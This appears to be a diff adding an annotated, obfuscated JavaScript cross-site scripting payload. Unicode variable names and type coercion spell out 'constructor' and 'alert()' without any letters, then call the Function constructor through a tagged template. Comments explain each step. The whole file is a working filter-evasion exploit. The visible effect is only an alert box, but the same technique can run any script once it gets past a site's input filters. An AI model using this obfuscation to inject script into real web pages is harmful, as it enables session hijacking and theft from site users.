@@ -1,0 +1,53 @@
+<script>
+/*
+〱='',〳=〱,ᘓ=〱+{},ᘒ=〱+[][[]],〱+=[〱==〱],〳+=[!〱],ᘑ=+[],ᘐ=+!+[],ᘔ=ᘐ+ᘐ,ᘕ=ᘔ+ᘐ,ᘖ=ᘔ+ᘕ,ᘖ+=ᘖ+ᘖ+ᘔ,ᘗ=ᘖ+ᘐ,ᘘ=ᘓ[ᘔ+ᘕ],ᘙ=ᘓ[ᘐ],ᘚ=〱[ᘐ],ᘲ=〱[ᘑ],ᘳ=ᘘ+ᘙ+ᘒ[ᘐ]+〳[ᘕ]+ᘲ+ᘚ+ᘒ[ᘑ]+ᘘ+ᘲ+ᘙ+〱[ᘐ],ᘰ=[][ᘳ][ᘳ],ᘏ=''+ᘰ,ᘎ=〳[ᘐ]+〳[ᘔ]+〱[ᘕ]+ᘚ+ᘲ+ᘏ[ᘖ]+ᘏ[ᘗ],ᘰ`ᘳ${ᘎ}```     
+*/
+
+
+〱=''
+〳=〱              //''
+ᘓ=〱+{}           //'[object Object]' <- '' + [object Object]
+ᘒ=〱+[][[]]       //'undefined'       <- '' + undefined 
+〱+=[〱==〱]       //'true'            <- Array from true
+〳+=[!〱]         //'false'            <- Array from !true
+ᘑ=+[]            //0                 
+ᘐ=+!+[]          //1
+ᘔ=ᘐ+ᘐ           //2                  <- 1+1
+ᘕ=ᘔ+ᘐ            //3                 <- 2+1
+ᘖ=ᘔ+ᘕ            //5                 <- 2+2+1
+ᘖ+=ᘖ+ᘖ+ᘔ         //17                <- 5+5+5+2
+ᘗ=ᘖ+ᘐ           //18                <- 17+1
+
+//letters that are used more than once defined seperately to shorten payload
+ᘘ=ᘓ[ᘔ+ᘕ]         //c                 <- '[object Object]'[5]
+ᘙ=ᘓ[ᘐ]          //o                 <- '[object Object]'[1]
+ᘚ=〱[ᘐ]          //r                 <- 'true'[1]
+ᘲ=〱[ᘑ]          //t                 <- 'true'[0]
+
+ᘳ=              //constructor
+    ᘘ+          //c                 <- '[object Object]'[5]
+    ᘙ+          //o                 <- '[object Object]'[1]
+    ᘒ[ᘐ]+       //n                 <- 'undefined'[1]
+    〳[ᘕ]+       //s                 <- 'false'[3]
+    ᘲ+          //t                 <- 'true'[0]
+    ᘚ+          //r                 <- 'true'[1]
+    ᘒ[ᘑ]+       //u                 <- 'undefined'[0]
+    ᘘ+          //c                 <-  '[object Object]'[5]
+    ᘲ+          //t                 <- 'true'[0]
+    ᘙ+          //o                 <- '[object Object]'[1]
+    〱[ᘐ]       //r                 <- 'true'[1]
+
+ᘰ = [][ᘳ][ᘳ]    //Function          <- []["constructor"]["constructor"] 
+ᘏ=''+ᘰ          //'function Function() { [native code] }'
+
+ᘎ=              //alert
+〳[ᘐ]+          //a                 <- 'false'[1]
+〳[ᘔ]+           //l                 <- 'false'[2]
+〱[ᘕ]+           //e                 <- 'true[4]
+ᘚ+              //r                 <- 'true'[1]
+ᘲ+              //t                 <- 'true'[0]
+ᘏ[ᘖ]+           //(                 <- 'function Function() { [native code] }'[17]
+ᘏ[ᘗ]           //)                 <- 'function Function() { [native code] }'[18]
+
+ᘰ`ᘳ${ᘎ}` ``     //alert()           <- []["constructor"]["constructor"]`ᘳ${"alert()"}` `` 
+</script>
